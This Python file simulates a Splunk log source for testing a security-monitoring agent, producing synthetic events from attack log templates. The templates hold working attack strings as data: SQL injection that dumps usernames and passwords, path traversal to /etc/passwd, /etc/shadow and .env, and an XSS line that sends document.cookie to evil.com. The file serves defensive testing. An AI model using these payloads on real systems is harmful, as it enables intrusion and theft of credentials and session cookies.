"""
Simulated Splunk data source for testing the security agent.

Generates realistic security events with varied attack types, severities,
and raw log formats. Runs a background thread to continuously produce
new events, simulating a live Splunk environment.
"""

import random
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Optional

# ── Attack type definitions with realistic raw log templates ──────────────

ATTACK_TEMPLATES = [
    {
        "attack_type": "SQL Injection",
        "severity_weights": {"critical": 0.15, "high": 0.35, "medium": 0.40, "low": 0.10},
        "descriptions": [
            "SQL injection attempt via URL parameter",
            "UNION-based SQL injection detected in login form",
            "Blind SQL injection via search field",
            "Error-based SQL injection in product ID parameter",
            "Time-based blind SQL injection in sort parameter",
        ],
        "raw_logs": [
            '192.168.1.100 - - [{ts}] "GET /api/products?id=1\' UNION SELECT username,password FROM users-- HTTP/1.1" 500 1234 "-" "sqlmap/1.6"',
            '192.168.1.100 - - [{ts}] "POST /login HTTP/1.1" 500 890 "-" "Mozilla/5.0" -- POST body: username=admin\' OR \'1\'=\'1\'--&password=test',
            '192.168.1.100 - - [{ts}] "GET /search?q=test\' AND SLEEP(5)-- HTTP/1.1" 200 567 "-" "Mozilla/5.0"',
            '192.168.1.100 - - [{ts}] "GET /product/1\' AND extractvalue(1,concat(0x7e,database()))-- HTTP/1.1" 500 891 "-" "curl/7.88"',
            '192.168.1.100 - - [{ts}] "GET /items?sort=price\' OR IF(1=1,SLEEP(3),0)-- HTTP/1.1" 200 445 "-" "python-requests/2.31"',
        ],
    },
    {
        "attack_type": "Brute Force SSH",
        "severity_weights": {"critical": 0.20, "high": 0.40, "medium": 0.30, "low": 0.10},
        "descriptions": [
            "Multiple failed SSH login attempts detected",
            "SSH brute force attack on root account",
            "Rapid SSH connection attempts from external IP",
            "Dictionary attack against SSH service",
            "Credential guessing on SSH port 22",
        ],
        "raw_logs": [
            '{ts} sshd[2341]: Failed password for root from {ip} port 54321 ssh2',
            '{ts} sshd[2342]: Failed password for admin from {ip} port 54322 ssh2',
            '{ts} sshd[2343]: Failed password for invalid user test from {ip} port 54323 ssh2',
            '{ts} sshd[2344]: Failed password for ubuntu from {ip} port 54324 ssh2',
            '{ts} sshd[2345]: Connection closed by authenticating user root {ip} port 54325 [preauth]',
        ],
    },
    {
        "attack_type": "Port Scan",
        "severity_weights": {"critical": 0.05, "high": 0.25, "medium": 0.45, "low": 0.25},
        "descriptions": [
            "Horizontal port scan detected across multiple ports",
            "SYN scan targeting common service ports",
            "Aggressive port scanning from external host",
            "Service discovery scan on internal network range",
            "Stealth SYN scan with randomized ports",
        ],
        "raw_logs": [
            '{ts} kernel: [IPTABLES] IN=eth0 OUT= MAC=xx:xx SRC={ip} DST=10.0.1.10 PROTO=TCP SPT=45678 DPT=22',
            '{ts} kernel: [IPTABLES] IN=eth0 OUT= MAC=xx:xx SRC={ip} DST=10.0.1.10 PROTO=TCP SPT=45679 DPT=80',
            '{ts} kernel: [IPTABLES] IN=eth0 OUT= MAC=xx:xx SRC={ip} DST=10.0.1.10 PROTO=TCP SPT=45680 DPT=443',
            '{ts} kernel: [IPTABLES] IN=eth0 OUT= MAC=xx:xx SRC={ip} DST=10.0.1.10 PROTO=TCP SPT=45681 DPT=3306',
            '{ts} kernel: [IPTABLES] IN=eth0 OUT= MAC=xx:xx SRC={ip} DST=10.0.1.10 PROTO=TCP SPT=45682 DPT=8080',
        ],
    },
    {
        "attack_type": "Malware C2 Callback",
        "severity_weights": {"critical": 0.50, "high": 0.30, "medium": 0.15, "low": 0.05},
        "descriptions": [
            "Outbound connection to known C2 server",
            "DNS query to malicious domain detected",
            "Beaconing traffic to command-and-control infrastructure",
            "Encrypted tunnel to known malware host",
            "Suspicious outbound HTTPS to newly registered domain",
        ],
        "raw_logs": [
            '{ts} proxy[8901]: TCP_MISS/200 4523 CONNECT evil-c2.xyz:443 - DIRECT/{ip} -',
            '{ts} named[567]: client 10.0.1.50#53: query: bad-domain.malware.net (A) IN',
            '{ts} suricata[234]: [1:2012345:3] "ET TROJAN CobaltStrike Beacon Detected" {ip}:443 -> 10.0.1.50:49152',
            '{ts} proxy[8901]: TCP_TUNNEL/200 0 CONNECT 194.61.23.12:8443 - DIRECT/{ip} -',
            '{ts} bro[456]: notice: SSL::Invalid_Server_Cert from {ip} to 10.0.1.50 (certificate is self-signed for suspicious domain)',
        ],
    },
    {
        "attack_type": "DDoS",
        "severity_weights": {"critical": 0.40, "high": 0.35, "medium": 0.20, "low": 0.05},
        "descriptions": [
            "HTTP flood from distributed source IPs",
            "SYN flood causing connection table exhaustion",
            "UDP amplification attack on DNS server",
            "Layer 7 HTTP GET flood on API endpoint",
            "Reflected NTP amplification attack",
        ],
        "raw_logs": [
            '{ts} nginx[123]: {ip} - - [{ts}] "GET / HTTP/1.1" 503 1234 "-" "Mozilla/5.0" upstream timed out',
            '{ts} kernel: [IPTABLES] SYN flood detected: 15000 SYN/sec from {ip} to 10.0.1.10:80',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /api/status HTTP/1.1" 503 567 "-" "python-requests/2.31"',
            '{ts} kernel: [IPTABLES] rate limiting: {ip} exceeded 10000 conn/sec threshold',
            '{ts} nginx[123]: {ip} - - [{ts}] "POST /login HTTP/1.1" 503 890 "-" "Mozilla/5.0" connection refused',
        ],
    },
    {
        "attack_type": "Credential Stuffing",
        "severity_weights": {"critical": 0.15, "high": 0.35, "medium": 0.40, "low": 0.10},
        "descriptions": [
            "Automated login attempts with known credentials",
            "Credential stuffing on user authentication endpoint",
            "High rate of login failures from single IP",
            "Bulk account takeover attempts detected",
            "Password spraying with common credentials",
        ],
        "raw_logs": [
            '{ts} app[web.1]: WARN  Failed login for user "john.doe@example.com" from {ip} - invalid password',
            '{ts} app[web.1]: WARN  Failed login for user "jane.smith@example.com" from {ip} - invalid password',
            '{ts} app[web.1]: WARN  Failed login for user "admin@company.com" from {ip} - account locked after 5 attempts',
            '{ts} app[web.1]: INFO  Rate limit triggered for {ip} - 50 login attempts in 60 seconds',
            '{ts} app[web.1]: WARN  Failed login for user "root@internal.net" from {ip} - invalid credentials',
        ],
    },
    {
        "attack_type": "XSS",
        "severity_weights": {"critical": 0.05, "high": 0.30, "medium": 0.45, "low": 0.20},
        "descriptions": [
            "Reflected XSS attempt via URL parameter",
            "Stored XSS payload in comment field",
            "DOM-based XSS detected in client-side script",
            "XSS probe with script tag injection",
            "polyglot XSS payload in form submission",
        ],
        "raw_logs": [
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 400 234 "-" "Mozilla/5.0"',
            '{ts} nginx[123]: {ip} - - [{ts}] "POST /comment HTTP/1.1" 200 567 "-" "Mozilla/5.0" -- POST body: comment=<img src=x onerror=alert(document.cookie)>',
            '{ts} app[web.1]: WARN  XSS filter triggered for request from {ip} - payload: <svg/onload=alert(1)>',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /profile?name=<script>document.location=\'http://evil.com/?c=\'+document.cookie</script> HTTP/1.1" 400 345 "-" "Mozilla/5.0"',
            '{ts} app[web.1]: WARN  Potential DOM XSS in #fragment from {ip} - payload: javascript:alert(document.domain)',
        ],
    },
    {
        "attack_type": "Path Traversal",
        "severity_weights": {"critical": 0.10, "high": 0.35, "medium": 0.40, "low": 0.15},
        "descriptions": [
            "Directory traversal attempt to read /etc/passwd",
            "Path traversal in file download parameter",
            "LFI attempt via PHP filter wrapper",
            "Attempt to access sensitive configuration file",
            "Double-encoded path traversal detected",
        ],
        "raw_logs": [
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /download?file=../../etc/passwd HTTP/1.1" 403 123 "-" "curl/7.88"',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /static/../../../var/log/auth.log HTTP/1.1" 403 234 "-" "python-requests/2.31"',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 403 345 "-" "Mozilla/5.0"',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /../../../.env HTTP/1.1" 403 456 "-" "curl/7.88"',
            '{ts} nginx[123]: {ip} - - [{ts}] "GET /files?name=....//....//....//etc/shadow HTTP/1.1" 403 567 "-" "Mozilla/5.0"',
        ],
    },
]

# ── Attacker IP pool ──────────────────────────────────────────────────────

ATTACKER_IPS = [
    "203.0.113.42",
    "198.51.100.73",
    "192.0.2.155",
    "45.33.32.100",
    "107.170.40.89",
    "185.220.101.34",
    "91.121.87.55",
    "62.210.16.120",
    "5.188.62.21",
    "141.98.10.65",
    "103.224.182.50",
    "194.26.29.113",
    "37.49.230.83",
    "116.31.116.15",
    "185.165.29.218",
]


# ── Event dataclass ───────────────────────────────────────────────────────

@dataclass
class SecurityEvent:
    timestamp: datetime
    severity: str  # critical, high, medium, low
    source_ip: str
    attack_type: str
    description: str
    raw_log: str


# ── Simulated Splunk ──────────────────────────────────────────────────────

class SimulatedSplunk:
    """In-memory Splunk simulator with pre-seeded events and live generation."""

    def __init__(self, seed_events: int = 30):
        self._events: list[SecurityEvent] = []
        self._lock = threading.Lock()
        self._running = True
        self._new_event_callback: Optional[callable] = None

        # Pre-seed with historical events spread over the past 2 hours
        self._seed_historical_events(seed_events)

        # Start background event generator
        self._generator_thread = threading.Thread(
            target=self._generate_events, daemon=True
        )
        self._generator_thread.start()

    # ── Public API ────────────────────────────────────────────────────

    def search(
        self,
        query: str,
        time_range: Optional[timedelta] = None,
        min_severity: Optional[str] = None,
    ) -> list[SecurityEvent]:
        """
        Search for events matching the query string across all fields.

        Args:
            query: Keyword or IP to search for.
            time_range: If set, only return events within this window from now.
            min_severity: If set, filter by minimum severity level.

        Returns:
            List of matching SecurityEvent objects, newest first.
        """
        severity_order = {"low": 0, "medium": 1, "high": 2, "critical": 3}

        with self._lock:
            results = []
            cutoff = datetime.now() - time_range if time_range else None
            min_sev_level = severity_order.get(min_severity, 0) if min_severity else 0

            for event in self._events:
                if cutoff and event.timestamp < cutoff:
                    continue
                if severity_order.get(event.severity, 0) < min_sev_level:
                    continue
                # Case-insensitive match against all string fields
                q = query.lower()
                if (
                    q in event.source_ip.lower()
                    or q in event.attack_type.lower()
                    or q in event.description.lower()
                    or q in event.raw_log.lower()
                ):
                    results.append(event)

            return sorted(results, key=lambda e: e.timestamp, reverse=True)

    def get_new_high_alerts(
        self, since: datetime
    ) -> list[SecurityEvent]:
        """
        Get high and critical severity alerts newer than `since`.

        Args:
            since: Timestamp to compare against.

        Returns:
            New high/critical alerts, newest first.
        """
        with self._lock:
            results = [
                e
                for e in self._events
                if e.timestamp > since
                and e.severity in ("high", "critical")
            ]
            return sorted(results, key=lambda e: e.timestamp, reverse=True)

    def get_events_by_ip(
        self, ip: str, time_range: timedelta
    ) -> list[SecurityEvent]:
        """
        Get all events involving a specific IP within a time window.

        Args:
            ip: Source IP to search for.
            time_range: Lookback window from now.

        Returns:
            All events from this IP in the window, newest first.
        """
        with self._lock:
            cutoff = datetime.now() - time_range
            results = [
                e for e in self._events
                if e.source_ip == ip and e.timestamp >= cutoff
            ]
            return sorted(results, key=lambda e: e.timestamp, reverse=True)

    def get_stats(self) -> dict:
        """Return current statistics about the event store."""
        with self._lock:
            total = len(self._events)
            by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
            by_type = {}
            for e in self._events:
                by_severity[e.severity] = by_severity.get(e.severity, 0) + 1
                by_type[e.attack_type] = by_type.get(e.attack_type, 0) + 1
            return {
                "total_events": total,
                "by_severity": by_severity,
                "by_attack_type": by_type,
            }

    def stop(self):
        """Signal the background generator to stop."""
        self._running = False

    # ── Internal ──────────────────────────────────────────────────────

    def _seed_historical_events(self, count: int):
        """Pre-populate the event store with historical events."""
        now = datetime.now()
        # Reserve ~30% of events as "recent" (within last 2 minutes) so the
        # agent has something to find on its very first check cycle.
        recent_count = max(3, count // 3)
        for i in range(count):
            if i < recent_count:
                # Very recent — within the last 2 minutes
                event_time = now - timedelta(seconds=random.uniform(5, 120))
            else:
                # Historical — spread over the past 2 hours
                event_time = now - timedelta(
                    seconds=random.uniform(180, 7200)
                )
            event = self._create_random_event(event_time)
            # Force higher severity on recent events so the agent catches them
            if i < recent_count:
                event.severity = random.choice(["high", "critical", "high"])
            self._events.append(event)

    def _generate_events(self):
        """Background thread: periodically add new random events."""
        while self._running:
            # Sleep 10–20 seconds between generations
            sleep_time = random.uniform(10, 20)
            # Check _running periodically for responsiveness
            deadline = time.time() + sleep_time
            while time.time() < deadline and self._running:
                time.sleep(0.5)

            if not self._running:
                break

            # Generate 0–3 new events
            count = random.choices([0, 1, 2, 3], weights=[0.2, 0.4, 0.3, 0.1])[0]
            new_events = []
            for _ in range(count):
                event = self._create_random_event(datetime.now())
                new_events.append(event)

            with self._lock:
                self._events.extend(new_events)

            if new_events and self._new_event_callback:
                for e in new_events:
                    self._new_event_callback(e)

    def _create_random_event(self, event_time: datetime) -> SecurityEvent:
        """Create a single random security event."""
        template = random.choice(ATTACK_TEMPLATES)
        severity = self._weighted_choice(template["severity_weights"])
        attacker_ip = random.choice(ATTACKER_IPS)
        description = random.choice(template["descriptions"])
        raw_log_template = random.choice(template["raw_logs"])

        # Format timestamp for Apache-style (dd/Mon/YYYY:HH:MM:SS +TZ) and syslog-style
        ts_apache = event_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ts_syslog = event_time.strftime("%b %d %H:%M:%S")

        raw_log = raw_log_template.format(ip=attacker_ip, ts=ts_apache)
        # Also handle syslog-style timestamps
        raw_log = raw_log.replace(ts_syslog, ts_syslog)  # no-op, just to be safe

        # If the template uses syslog format (no {ts} in Apache format), use syslog ts
        if "{ts}" in raw_log_template and "[" not in raw_log_template.split("{ts}")[0]:
            raw_log = raw_log_template.format(ip=attacker_ip, ts=ts_syslog)

        return SecurityEvent(
            timestamp=event_time,
            severity=severity,
            source_ip=attacker_ip,
            attack_type=template["attack_type"],
            description=description,
            raw_log=raw_log,
        )

    @staticmethod
    def _weighted_choice(weights: dict[str, float]) -> str:
        """Pick a key from a dict based on its weight value."""
        items = list(weights.items())
        keys = [k for k, _ in items]
        probs = [w for _, w in items]
        return random.choices(keys, weights=probs)[0]
